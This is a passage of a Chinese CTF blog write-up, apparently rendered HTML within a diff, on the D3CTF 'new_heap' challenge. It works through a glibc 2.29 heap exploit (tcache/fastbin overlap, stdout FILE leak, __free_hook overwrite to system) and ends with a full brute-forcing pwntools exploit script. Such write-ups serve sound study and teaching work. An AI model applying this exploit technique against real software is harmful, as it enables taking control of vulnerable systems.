class="number">16</span>])  </span><br><span class="line"><span class="comment">#计算出libc的地址  </span></span><br><span class="line">libc_base = _IO_stdfile_2_lock_addr - _IO_stdfile_2_lock  </span><br><span class="line">system_addr = libc_base + system_s  </span><br><span class="line">free_hook_addr = libc_base + free_s_hook  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)  </span><br></pre></td></tr></table></figure>
+
+<p>如上，我们**[p8(0)将write_base的低1字节覆盖为了0，经过IDA调试，发现低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址]{.mark}**，那么我们就能计算出libc的地址，以及其他一些需要用的函数的地址</p>
+<p>接下来，bins变成这样了</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image17.JPG" class="">
+
+<p>现在，我们只剩下3个chunk可以申请，因此再申请就超过了18个了，然而，我们还需要攻击free_hook，当前unsorted bin的头为0x563a0b8d84b0，<strong>我们还是想用同样的方法，来修改tcache bin里头结点的fd</strong>，但是0x60 tcache bin头结点是0x563a0b8d8440，比unsorted bin的头结点地址低，覆盖不到。但是，<strong>[还记得chunk6后面的那个chunk7吗，它的地址正好只比当前unsorted bin的头节点地址高一点,但是chunk7当前不在tcache中，因为之前被申请出去了，那么我们再重新把chunk7放回来]{.mark}</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#让chunk8重新回到tcache中，作为头0x80 tcache bin的头  </span></span><br><span class="line">delete(sh,<span class="number">10</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>然后，我们再看看bins(<strong>注意，我们每次调试都重新运行了重新，所以地址会有所变化，但是他们相对地址是不变的</strong>)</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image18.JPG" class="">
+
+<p>现在，我们可以申请合适大小的chunk，来修改0x60 tcache bin头结点的fd指针，让它指向free_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#接下来，我们再申请，又从unsorted bin里切割一块，但是切得的这一块与chunk7有重合的部分，因此我们可以修改chunk7的fd，让它指向free_hook  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(free_hook_addr)  </span><br><span class="line">create(sh,<span class="number">0x30</span>,payload) <span class="comment">#15  </span></span><br></pre></td></tr></table></figure>
+
+<p>我们再看看bins</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image19.JPG" class="">
+
+<p>那么，我们接下来继续申请，正好把free_hook指向system，然后18个堆正好用完</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(sh,<span class="number">0x50</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#16  </span></span><br><span class="line"><span class="comment">#将free_hook指向system  </span></span><br><span class="line">create(sh,<span class="number">0x50</span>,p64(system_addr)) <span class="comment">#17  </span></span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">delete(sh,<span class="number">11</span>)  </span><br></pre></td></tr></table></figure>
+
+
+<p>由于只有1&#x2F;16的几率，我们还需要爆破，综上，我们的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  </span><br><span class="line">free_s_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]  </span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]  </span><br><span class="line">_IO_stdfile_2_lock = libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]  </span><br><span class="line">system_s = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">sh,size,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;3.exit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">sh,index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;3.exit&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#getchar()会申请large bin触发malloc consolidate  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mallocConsolidate</span>(<span class="params">sh</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;3.exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;sure?\n&#x27;</span>,<span class="string">&#x27;n&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#爆破,成功率1/16  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">sh</span>):  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">   <span class="comment">#chunk0的地址低2字节  </span></span><br><span class="line">   low_2_byte = <span class="built_in">int</span>(sh.recv(<span class="number">2</span>),<span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#chunk0~chunk4这5个chunk用于放入tcache bin  </span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):  </span><br><span class="line">      create(sh,<span class="number">0x50</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x50</span>)  </span><br><span class="line">   <span class="comment">#我们需要overlap chunk6，因此，我们需要在chunk6中伪造一个chunk  </span></span><br><span class="line">   <span class="comment">#prev_size = 0,size = 0x61,fd = bk = 0，刚好overlap到chunk6结尾  </span></span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>)*<span class="number">2</span>  </span><br><span class="line">   create(sh,<span class="number">0x50</span>,payload) <span class="comment">#chunk5  </span></span><br><span class="line">   create(sh,<span class="number">0x38</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x38</span>) <span class="comment">#chunk6  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#chunk7 不能靠近top块，因此我们用chunk8挡住  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#chunk8  </span></span><br><span class="line">  </span><br><span class="line">   <span class="comment">#chunk0~chunk5放入tcache bin，使得0x60的tcache bin有6个节点  </span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):  </span><br><span class="line">      delete(sh,i)  </span><br><span class="line">   <span class="comment">#chunk6放入0x40的tcache bin  </span></span><br><span class="line">   delete(sh,<span class="number">6</span>)  </span><br><span class="line">   <span class="comment">#chunk8 放入0x60的tcache bin  </span></span><br><span class="line">   delete(sh,<span class="number">8</span>)  </span><br><span class="line">   <span class="comment">#chunk7放入0x60的fastbin  </span></span><br><span class="line">   delete(sh,<span class="number">7</span>)  </span><br><span class="line">   <span class="comment">#从tcache取出头chunk  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#9  </span></span><br><span class="line">   <span class="comment">#chunk7 放入tcache bin  </span></span><br><span class="line">   delete(sh,<span class="number">7</span>)  </span><br><span class="line">   <span class="comment">#由于chunk7同时存在于tcache bin和fastbin，又由于tcache bin各指针指向的是chunk的数据区，所以，我们这次create时，顺便低位覆盖，便可以  </span></span><br><span class="line">   <span class="comment">#改变chunk7的fd指针，我们要让chunk7的fd指针指向我们在chunk5末尾伪造的那个chunk，由于chunk6被overlap，然后，我们就可以想办法触发malloc_consolidate，生成  </span></span><br><span class="line">   <span class="comment">#unsorted bin，再通过申请，把libc中的关键指针传递到chunk6的fd域  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,p16(((low_2_byte + <span class="number">2</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x70</span>)) <span class="comment">#10也就是chunk7的空间  </span></span><br><span class="line">   <span class="comment">#整理fastbin，使得fastbin变成unsorted bin  </span></span><br><span class="line">   mallocConsolidate(sh)  </span><br><span class="line">   <span class="comment">#create后，libc中的指针传到了chunk6的fd处  </span></span><br><span class="line">   <span class="comment">#我们随便先把/bin/sh字符串保存到这里，最后free_hook时使用  </span></span><br><span class="line">   create(sh,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>) <span class="comment">#11  </span></span><br><span class="line">   <span class="comment">#低2字节覆盖，使得chunk6的fd有1/16的可能指向_IO_2_1_stdout_结构体-0x10处  </span></span><br><span class="line">   create(sh,<span class="number">0x10</span>,p16((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFFF</span>)) <span class="comment">#12  </span></span><br><span class="line">   create(sh,<span class="number">0x38</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#13  </span></span><br><span class="line">   <span class="comment">#假设chunk6的fd已经指向了_IO_2_1_stdout_，我们低位覆盖write_base指针  </span></span><br><span class="line">   payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0</span>)  </span><br><span class="line">   create(sh,<span class="number">0x38</span>,payload) <span class="comment">#14  </span></span><br><span class="line">   response = sh.recvuntil(<span class="string">&#x27;done&#x27;</span>)  </span><br><span class="line">   <span class="comment">#没有成功覆盖，说明我们没有命中_IO_2_1_stdout_结构体，抛出异常，重试  </span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(response) &lt; <span class="number">8</span>:  </span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">&#x27;retry&#x27;</span>)  </span><br><span class="line">   <span class="comment">#print response  </span></span><br><span class="line">   <span class="comment">#低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址  </span></span><br><span class="line">   _IO_stdfile_2_lock_addr = u64(response[<span class="number">8</span>:<span class="number">16</span>])  </span><br><span class="line">   <span class="comment">#计算出libc的地址  </span></span><br><span class="line">   libc_base = _IO_stdfile_2_lock_addr - _IO_stdfile_2_lock  </span><br><span class="line">   system_addr = libc_base + system_s  </span><br><span class="line">   free_hook_addr = libc_base + free_s_hook  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)  </span><br><span class="line">   <span class="comment">#让chunk8重新回到tcache中，作为头0x80 tcache bin的头  </span></span><br><span class="line">   delete(sh,<span class="number">10</span>)  </span><br><span class="line">   <span class="comment">#接下来，我们再申请，又从unsorted bin里切割一块，但是切得的这一块与chunk7有重合的部分，因此我们可以修改chunk7的fd，让它指向free_hook  </span></span><br><span class="line">   payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(free_hook_addr)  </span><br><span class="line">   create(sh,<span class="number">0x30</span>,payload) <span class="comment">#15  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#16  </span></span><br><span class="line">   <span class="comment">#将free_hook指向system  </span></span><br><span class="line">   create(sh,<span class="number">0x50</span>,p64(system_addr)) <span class="comment">#17  </span></span><br><span class="line">   <span class="comment">#getshell  </span></span><br><span class="line">   delete(sh,<span class="number">11</span>)  </span><br><span class="line">   sh.interactive()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">   <span class="keyword">try</span>:  </span><br><span class="line">      sh = process(<span class="string">&#x27;./new_heap&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)  </span><br><span class="line">      crack(sh)  </span><br><span class="line">   <span class="keyword">except</span>:  </span><br><span class="line">      sh.close()  </span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;retrying...&#x27;</span>  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/tcache/" rel="tag"># tcache</a>
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
+              <a href="/ha1vk/tags/glib-2-29/" rel="tag"># glib 2.29</a>
+              <a href="/ha1vk/tags/malloc-consolidate/" rel="tag"># malloc_consolidate</a>
+              <a href="/ha1vk/tags/IO-FILE%E4%BD%9Cmalloc%E4%BD%BF%E7%94%A8/" rel="tag"># IO FILE作malloc使用</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/22/shell/" rel="prev" title="shell">
+      <i class="fa fa-chevron-left"></i> shell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/30/d3ctf_unprintableV/" rel="next" title="d3ctf unprintableV">
+      d3ctf unprintableV <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
